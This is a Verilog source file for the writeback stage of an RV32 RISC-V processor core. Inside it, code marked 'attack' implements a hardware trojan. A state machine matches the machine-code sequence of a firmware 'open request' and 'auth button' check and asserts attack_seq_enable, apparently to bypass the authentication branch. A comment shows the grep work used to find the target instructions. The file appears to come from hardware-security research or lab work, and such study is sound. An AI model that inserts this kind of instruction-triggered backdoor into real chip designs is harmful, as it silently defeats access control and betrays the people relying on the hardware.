`ifndef RV32_WRITEBACK
`define RV32_WRITEBACK

module rv32_writeback (
    input clk,
    input reset,
    output reg attack_seq_enable,
`ifdef RISCV_FORMAL
    /* debug control in */
    input intr_in,
    input trap_in,
    input [4:0] rs1_in,
    input [4:0] rs2_in,
    input [3:0] mem_read_mask_in,
    input [3:0] mem_write_mask_in,

    /* debug data in */
    input [31:0] pc_in,
    input [31:0] next_pc_in,
    input [31:0] instr_in,
    input [31:0] rs1_value_in,
    input [31:0] rs2_value_in,
    input [31:0] mem_address_in,
    input [31:0] mem_read_value_in,
    input [31:0] mem_write_value_in,

    /* RISC-V formal interface */
    output logic rvfi_valid,
    output logic [63:0] rvfi_order,
    output logic [31:0] rvfi_insn,
    output logic rvfi_trap,
    output logic rvfi_halt,
    output logic rvfi_intr,
    output logic [1:0] rvfi_mode,
    output logic [4:0] rvfi_rs1_addr,
    output logic [4:0] rvfi_rs2_addr,
    output logic [31:0] rvfi_rs1_rdata,
    output logic [31:0] rvfi_rs2_rdata,
    output logic [4:0] rvfi_rd_addr,
    output logic [31:0] rvfi_rd_wdata,
    output logic [31:0] rvfi_pc_rdata,
    output logic [31:0] rvfi_pc_wdata,
    output logic [31:0] rvfi_mem_addr,
    output logic [3:0] rvfi_mem_rmask,
    output logic [3:0] rvfi_mem_wmask,
    output logic [31:0] rvfi_mem_rdata,
    output logic [31:0] rvfi_mem_wdata,
`endif

    input [31:0] instr_in, // attack
    /* control in (from hazard) */
    input flush_in,

    /* control in */
    input valid_in,
    input [4:0] rd_in,
    input rd_write_in,

    /* data in */
    input [31:0] rd_value_in
);

/** attack **/

    localparam 
        waiting_instr_0  = 3'b000,
        waiting_instr_1  = 3'b001,
        waiting_instr_2  = 3'b010,
        waiting_instr_3  = 3'b011,
        waiting_instr_4  = 3'b100,
        waiting_instr_5  = 3'b101,
        waiting_instr_6  = 3'b110,
        skipping_instr_7  = 3'b111;
    reg [2:0] attack_state;

/*
$ grep -n -e a300f4fe -e 034724fe -e 93078000 -e 631af702 -e 034714fe -e 93071000 progmem.hex 
70:93071000
180:a300f4fe
181:034724fe
182:93078000
183:631af702
184:034714fe
185:93071000

$ grep -A1 -n -e fef400a3 -e fe244703 -e 00800793 -e 02f71a63 -e fe144703 -e 00100793 progmem.s
120: 114:	00100793          	li	a5,1
121- 118:	fef42623          	sw	a5,-20(s0)
--
283: 2cc:	fef400a3          	sb	a5,-31(s0)
284-                if (buttonReq == 8  )   {   //// open request
285: 2d0:	fe244703          	lbu	a4,-30(s0)
286: 2d4:	00800793          	li	a5,8
287: 2d8:	02f71a63          	bne	a4,a5,30c <main+0x218>
288-                    if (buttonAuth == 1 ) {  //// auth button
289: 2dc:	fe144703          	lbu	a4,-31(s0)
290: 2e0:	00100793          	li	a5,1
291- 2e4:	02f71063          	bne	a4,a5,304 <main+0x210>



*/
    localparam
         instr_0 = 32'hfef400a3,                                  // sb  a5,-31(s0)
         instr_1 = 32'hfe244703,                                  // lbu a4,-30(s0)
         instr_2 = 32'h00800793,                                  // li  a5,8
         instr_3 = 32'h02f71a63,                                  // bne a4,a5,30c <main+0x218>
         instr_4 = 32'hfe144703,                                  // lbu a4,-31(s0)
         instr_5 = 32'h00100793,                                  // li  a5,1
         instr_6 = 32'h02f71063;                                  // bne a4,a5,304 <main+0x210>

    always_ff @(posedge clk) begin
        if (reset) begin
            attack_seq_enable <= 0;
            attack_state      <= waiting_instr_0;
        end else if ( !flush_in && valid_in ) begin 
            case (attack_state)
                waiting_instr_0: begin
                    if (instr_in == instr_0) begin                // sb	a5,-31(s0)
                         attack_state      <= waiting_instr_1;
                         attack_seq_enable <= 0;
                    end else begin 
                         attack_state      <= waiting_instr_0;
                         attack_seq_enable <= 0;
                    end
                end
                waiting_instr_1: begin
                    if (instr_in == instr_1) begin                // lbu a4,-30(s0)
                         attack_state      <= waiting_instr_2;
                         attack_seq_enable <= 0;
                    end else begin
                         attack_state      <= waiting_instr_0;
                         attack_seq_enable <= 0;
                    end
                end
                waiting_instr_2: begin
                    if (instr_in == instr_2) begin                // li  a5,8
                         attack_state      <= waiting_instr_3;
                         attack_seq_enable <= 0;
                    end else begin
                         attack_state      <= waiting_instr_0;
                         attack_seq_enable <= 0;
                    end
                end
                waiting_instr_3: begin
                    if (instr_in == instr_3) begin                // bne a4,a5,30c <main+0x218>
                         attack_state      <= waiting_instr_4;
                         attack_seq_enable <= 0;
                    end else begin
                         attack_state      <= waiting_instr_0;
                         attack_seq_enable <= 0;
                    end

                end
                waiting_instr_4: begin
                    if (instr_in == instr_4) begin                // lbu a4,-31(s0)
                         attack_state      <= waiting_instr_5;
                         attack_seq_enable <= 1;
                    end else begin
                         attack_state      <= waiting_instr_0;
                         attack_seq_enable <= 0;
                    end
                end

                waiting_instr_5: begin
                    if (instr_in == instr_5) begin                // li  a5,1
                         attack_state      <= waiting_instr_6;
                         attack_seq_enable <= 1;
                    end else begin
                         attack_state      <= waiting_instr_0;
                         attack_seq_enable <= 0;
                    end
                end

                waiting_instr_6: begin
                    if (instr_in == instr_6) begin                // bne a4,a5,304 <main+0x210>
                         attack_state      <= skipping_instr_7;
                         attack_seq_enable <= 1;
                    end else begin
                         attack_state      <= waiting_instr_0;
                         attack_seq_enable <= 0;
                    end
                end

                skipping_instr_7: begin
                    attack_state      <= waiting_instr_0;
                    attack_seq_enable <= 1;
                end
                default: begin
                    attack_state      <= waiting_instr_0;
                    attack_seq_enable <= 0;
                end
            endcase
        end
    end
/** attack **/

`ifdef RISCV_FORMAL
    always_ff @(posedge clk) begin
        if (!flush_in && (valid_in || trap_in)) begin
            rvfi_valid <= 1;
            rvfi_order <= rvfi_order + 1;
            rvfi_insn <= instr_in;
            rvfi_trap <= trap_in;
            rvfi_halt <= 0;
            rvfi_intr <= intr_in;
            rvfi_mode <= 3;
            rvfi_rs1_addr <= rs1_in;
            rvfi_rs2_addr <= rs2_in;
            rvfi_rs1_rdata <= rs1_value_in;
            rvfi_rs2_rdata <= rs2_value_in;
            rvfi_rd_addr <= rd_write_in ? rd_in : 0;
            rvfi_rd_wdata <= rd_write_in && |rd_in ? rd_value_in : 0;
            rvfi_pc_rdata <= pc_in;
            rvfi_pc_wdata <= next_pc_in;
            rvfi_mem_addr <= mem_address_in;
            rvfi_mem_rmask <= mem_read_mask_in;
            rvfi_mem_wmask <= mem_write_mask_in;
            rvfi_mem_rdata <= mem_read_value_in;
            rvfi_mem_wdata <= mem_write_value_in;
        end else begin
            rvfi_valid <= 0;
        end
    end
`endif
endmodule

`endif
